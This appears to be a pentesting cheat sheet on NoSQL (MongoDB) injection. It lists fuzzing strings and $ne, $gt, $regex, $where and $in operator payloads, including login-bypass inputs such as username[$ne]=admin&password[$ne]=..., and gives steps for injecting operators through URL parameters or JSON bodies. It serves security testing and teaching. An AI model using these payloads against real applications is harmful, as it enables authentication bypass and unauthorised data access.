#### Burp Suite Extensions

- NoSQLiScanner

### Fuzzing Strings (non-encoded)

```
"                 // Break out of string
'                 // Single-quote escape
`                 // Template literal (backtick)
{                 // Object injection
}                 // Close object
[                 // Array injection
]                 // Close array
$ne: ""           // Not equal
$ne: null         // Not equal null
$gt: ""           // Greater than
$regex: ".*"      // Regex match anything
$where: "1 == 1"  // JavaScript expression eval
"; return true; // // JS logic injection
{$ne:null}        // Common object test
{"$gt":""}        // Injection via JSON
{$where:"this.password.length < 999"} // Runtime eval
admin' && '1'=='1 // Logic-based string test
') // Close paren string
" || 1==1         // Logic test
Foo               // Simple string (baseline)
$Foo              // Dollar-prefixed test
;                 // Statement delimiter

```

### PHP
```SQL
username[$ne]=admin&password[$ne]=sdfasdf
```

### Operator Injections

#### MongoDB Operators

```txt
$where - Matches documents that satisfy a JavaScript expression.

$ne - Matches all values that are not equal to a specified value.

$in - Matches all of the values specified in an array.

$regex - Selects documents where values match a specified regular expression. ex. {"username":{"$regex":"admin.*"} #this looks for anything that starts with admin
```

#### Submitting Queries

In JSON messages, you can insert query operators as nested objects.
```txt
{"username":"wiener"} becomes {"username":{"$ne":"invalid"}}.
```

Also if known inputs:
```txt
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

For URL-based inputs, you can insert query operators via URL parameters:
```txt
username=wiener becomes username[$ne]=invalid
```
If this doesn't work, you can try the following:
```txt
Convert the request method from GET to POST.
Change the Content-Type header to application/json.
Add JSON to the message body.
Inject query operators in the JSON.
```
